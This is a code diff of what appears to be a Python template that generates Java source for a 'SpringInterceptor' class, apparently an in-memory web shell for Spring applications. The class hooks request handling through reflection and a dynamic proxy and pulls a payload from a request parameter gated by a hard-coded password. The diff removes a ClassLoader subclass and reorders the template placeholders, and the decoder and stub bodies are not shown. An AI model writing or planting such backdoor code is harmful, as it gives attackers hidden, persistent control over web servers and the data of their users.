@@ -1,16 +1,13 @@
 code = """
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.*;
 
-public class SpringInterceptor extends ClassLoader implements InvocationHandler {{
+public class SpringInterceptor implements InvocationHandler {{
     private static String password = "{password}";
 {common}
+{context}
 {decoder}
 {stub}
-{context}
     private void hook(Object request, Object response) throws Exception {{
         String payload = (String) invokeMethod(
             request, "getParameter", password
@@ -70,10 +67,6 @@ public class SpringInterceptor extends ClassLoader implements InvocationHandler 
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public SpringInterceptor(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
